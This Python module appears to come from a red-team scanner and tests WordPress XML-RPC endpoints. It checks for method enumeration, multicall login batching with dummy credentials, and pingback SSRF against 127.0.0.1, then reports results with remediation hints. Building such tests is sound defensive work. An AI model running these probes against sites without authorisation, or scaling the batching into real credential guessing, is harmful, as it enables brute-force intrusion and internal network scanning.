"""WordPress XML-RPC abuse attacks — HIGH severity.

Tests XML-RPC attack vectors including endpoint availability, method
enumeration, multicall brute-force amplification, and pingback SSRF.
"""

import time
import logging

from redteam.base import Attack, AttackResult, Severity, Status

logger = logging.getLogger(__name__)

# Methods that are particularly dangerous if exposed
DANGEROUS_METHODS = {
    "wp.getUsersBlogs",
    "wp.getUsers",
    "wp.getProfile",
    "wp.editProfile",
    "wp.newPost",
    "wp.editPost",
    "wp.deletePost",
    "wp.getOptions",
    "wp.setOptions",
    "wp.uploadFile",
    "wp.newComment",
    "wp.editComment",
    "wp.deleteComment",
    "pingback.ping",
    "pingback.extensions.getPingbacks",
    "system.multicall",
}


class XmlrpcAbuseAttack(Attack):
    """Test XML-RPC attack vectors on WordPress sites."""

    name = "wordpress.xmlrpc_abuse"
    category = "wordpress"
    severity = Severity.HIGH
    description = "XML-RPC endpoint abuse: brute-force amplification, SSRF, and method enumeration"
    target_types = {"wordpress"}

    async def execute(self, client) -> list[AttackResult]:
        results = []

        results.append(await self._test_xmlrpc_enabled(client))
        results.append(await self._test_method_enumeration(client))

        if not self._is_aws_mode():
            results.append(await self._test_multicall_amplification(client))
            results.append(await self._test_pingback_ssrf(client))
        else:
            results.append(self._make_result(
                variant="multicall_amplification",
                status=Status.SKIPPED,
                details="Skipped in AWS mode — multicall brute-force test could trigger rate limiting.",
            ))
            results.append(self._make_result(
                variant="pingback_ssrf",
                status=Status.SKIPPED,
                details="Skipped in AWS mode — SSRF payloads target internal IPs.",
            ))

        return results

    async def _test_xmlrpc_enabled(self, client) -> AttackResult:
        """GET /xmlrpc.php — check if the endpoint responds at all."""
        start = time.monotonic()
        try:
            status, body, headers = await client.get(client.xmlrpc_path, cookies={})
            duration = (time.monotonic() - start) * 1000

            enabled_indicators = [
                "XML-RPC server accepts POST requests only",
                "xml-rpc",
                "xmlrpc",
            ]
            is_enabled = status in (200, 405) or any(
                ind.lower() in body.lower() for ind in enabled_indicators
            )

            if is_enabled:
                return self._make_result(
                    variant="xmlrpc_enabled",
                    status=Status.VULNERABLE,
                    severity=Severity.MEDIUM,
                    evidence=f"XML-RPC endpoint active: HTTP {status}, body hint: {body[:200]}",
                    details=(
                        f"GET {client.xmlrpc_path} returned HTTP {status}. "
                        f"XML-RPC is enabled and accepting requests. "
                        f"This exposes brute-force amplification, SSRF, and DDoS vectors. "
                        f"Disable XML-RPC if not required (e.g., via plugin or .htaccess)."
                    ),
                    request={"method": "GET", "path": client.xmlrpc_path},
                    response={"status": status, "body": body[:300]},
                    duration_ms=duration,
                )

            return self._make_result(
                variant="xmlrpc_enabled",
                status=Status.DEFENDED,
                evidence=f"HTTP {status}, XML-RPC appears disabled",
                details=f"XML-RPC endpoint returned HTTP {status} with no active indicators.",
                request={"method": "GET", "path": client.xmlrpc_path},
                response={"status": status},
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="xmlrpc_enabled",
                status=Status.ERROR,
                details=f"Error testing XML-RPC: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_method_enumeration(self, client) -> AttackResult:
        """Call system.listMethods — enumerate available XML-RPC methods."""
        start = time.monotonic()
        try:
            status, body, headers = await client.xmlrpc_call("system.listMethods")
            duration = (time.monotonic() - start) * 1000

            # Parse method names from XML response
            methods = []
            if "<string>" in body:
                import re
                methods = re.findall(r"<string>([^<]+)</string>", body)

            if not methods:
                return self._make_result(
                    variant="method_enumeration",
                    status=Status.DEFENDED,
                    evidence=f"HTTP {status}, no methods returned",
                    details=f"system.listMethods returned HTTP {status} with no method list.",
                    request={"method": "POST", "xmlrpc_call": "system.listMethods"},
                    response={"status": status, "body": body[:300]},
                    duration_ms=duration,
                )

            dangerous_found = [m for m in methods if m in DANGEROUS_METHODS]

            if dangerous_found:
                sev = Severity.HIGH if len(dangerous_found) >= 5 else Severity.MEDIUM
                return self._make_result(
                    variant="method_enumeration",
                    status=Status.VULNERABLE,
                    severity=sev,
                    evidence=f"{len(methods)} methods available, {len(dangerous_found)} dangerous",
                    details=(
                        f"system.listMethods returned {len(methods)} methods. "
                        f"Dangerous methods found: {', '.join(dangerous_found)}. "
                        f"These enable brute-force (wp.getUsersBlogs), "
                        f"content manipulation (wp.newPost), and SSRF (pingback.ping)."
                    ),
                    request={"method": "POST", "xmlrpc_call": "system.listMethods"},
                    response={"status": status, "method_count": len(methods), "dangerous": dangerous_found},
                    duration_ms=duration,
                )

            return self._make_result(
                variant="method_enumeration",
                status=Status.DEFENDED,
                severity=Severity.LOW,
                evidence=f"{len(methods)} methods available, none dangerous",
                details=(
                    f"system.listMethods returned {len(methods)} methods "
                    f"but no high-risk methods were found."
                ),
                request={"method": "POST", "xmlrpc_call": "system.listMethods"},
                response={"status": status, "method_count": len(methods)},
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="method_enumeration",
                status=Status.ERROR,
                details=f"Error enumerating methods: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_multicall_amplification(self, client) -> AttackResult:
        """Test system.multicall with 5 wp.getUsersBlogs attempts in a single request.

        If the server processes all sub-calls, an attacker can attempt many
        credential pairs in one HTTP request, bypassing per-request rate limiting.
        """
        start = time.monotonic()
        try:
            # Build 5 login attempts with dummy credentials
            calls = [
                ("wp.getUsersBlogs", [f"testuser{i}", f"wrongpass{i}"])
                for i in range(5)
            ]
            status, body, headers = await client.xmlrpc_multicall(calls)
            duration = (time.monotonic() - start) * 1000

            # Count how many sub-responses we got back
            import re
            fault_count = len(re.findall(r"<fault>", body))
            value_count = len(re.findall(r"<value>", body))

            # If we get multiple fault/value blocks, each sub-call was processed
            responses_processed = max(fault_count, value_count // 2)

            if responses_processed >= 3:
                return self._make_result(
                    variant="multicall_amplification",
                    status=Status.VULNERABLE,
                    severity=Severity.HIGH,
                    evidence=f"Multicall processed {responses_processed}/5 sub-calls in one request",
                    details=(
                        f"system.multicall with 5 wp.getUsersBlogs attempts returned "
                        f"{responses_processed} individual responses. An attacker can batch "
                        f"hundreds of login attempts per HTTP request, bypassing rate limiting. "
                        f"Faults: {fault_count}, Value blocks: {value_count}."
                    ),
                    request={"method": "POST", "xmlrpc_call": "system.multicall", "sub_calls": 5},
                    response={"status": status, "faults": fault_count, "values": value_count},
                    duration_ms=duration,
                )

            if status in (403, 405) or "not allowed" in body.lower():
                return self._make_result(
                    variant="multicall_amplification",
                    status=Status.DEFENDED,
                    evidence=f"HTTP {status}, multicall blocked",
                    details=f"system.multicall is blocked or disabled (HTTP {status}).",
                    request={"method": "POST", "xmlrpc_call": "system.multicall"},
                    response={"status": status, "body": body[:300]},
                    duration_ms=duration,
                )

            return self._make_result(
                variant="multicall_amplification",
                status=Status.DEFENDED,
                evidence=f"HTTP {status}, only {responses_processed}/5 processed",
                details=(
                    f"system.multicall returned HTTP {status} but only processed "
                    f"{responses_processed} of 5 sub-calls. Amplification limited."
                ),
                request={"method": "POST", "xmlrpc_call": "system.multicall", "sub_calls": 5},
                response={"status": status, "faults": fault_count, "values": value_count},
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="multicall_amplification",
                status=Status.ERROR,
                details=f"Error testing multicall: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_pingback_ssrf(self, client) -> AttackResult:
        """Call pingback.ping with an internal IP to test for SSRF.

        Sends source_url=http://127.0.0.1:80/ and target_url as the site URL.
        If the error message leaks details about the internal request, the
        server is vulnerable to SSRF via XML-RPC pingback.
        """
        start = time.monotonic()

        # Respect blocked IPs
        blocked = self._get_blocked_ips()
        source_ip = "http://127.0.0.1:80/"
        if any(ip in source_ip for ip in blocked):
            return self._make_result(
                variant="pingback_ssrf",
                status=Status.SKIPPED,
                details=f"SSRF test skipped — 127.0.0.1 is in blocked_ips: {blocked}",
            )

        try:
            target_url = f"{client.base_url}/"
            status, body, headers = await client.xmlrpc_call(
                "pingback.ping", [source_ip, target_url]
            )
            duration = (time.monotonic() - start) * 1000

            # SSRF indicators in the response
            ssrf_indicators = [
                "is not a valid pingback target",  # Server made the request to check
                "The source URL does not contain a link",  # Server fetched source_url
                "The source URL does not exist",  # Server tried to reach it
                "HTTP 200",
                "connection refused",
                "timed out",
                "response code",
            ]
            found_indicators = [
                ind for ind in ssrf_indicators if ind.lower() in body.lower()
            ]

            # If we see evidence the server tried to reach the internal IP
            if found_indicators:
                return self._make_result(
                    variant="pingback_ssrf",
                    status=Status.VULNERABLE,
                    severity=Severity.HIGH,
                    evidence=f"Pingback SSRF indicators found: {found_indicators}",
                    details=(
                        f"pingback.ping with source_url={source_ip} returned indicators "
                        f"that the server attempted an internal request: {', '.join(found_indicators)}. "
                        f"This enables Server-Side Request Forgery to scan internal networks "
                        f"and access internal services."
                    ),
                    request={"method": "POST", "xmlrpc_call": "pingback.ping", "source": source_ip, "target": target_url},
                    response={"status": status, "body": body[:500]},
                    duration_ms=duration,
                )

            if status in (403, 405) or "<fault>" not in body:
                return self._make_result(
                    variant="pingback_ssrf",
                    status=Status.DEFENDED,
                    evidence=f"HTTP {status}, no SSRF indicators",
                    details=f"pingback.ping returned HTTP {status} with no evidence of internal request.",
                    request={"method": "POST", "xmlrpc_call": "pingback.ping"},
                    response={"status": status, "body": body[:300]},
                    duration_ms=duration,
                )

            return self._make_result(
                variant="pingback_ssrf",
                status=Status.DEFENDED,
                evidence=f"HTTP {status}, fault returned but no SSRF leak",
                details=f"pingback.ping returned a fault without leaking internal request details.",
                request={"method": "POST", "xmlrpc_call": "pingback.ping"},
                response={"status": status, "body": body[:300]},
                duration_ms=duration,
            )
        except Exception as e:
            return self._make_result(
                variant="pingback_ssrf",
                status=Status.ERROR,
                details=f"Error testing pingback SSRF: {e}",
                duration_ms=(time.monotonic() - start) * 1000,
            )
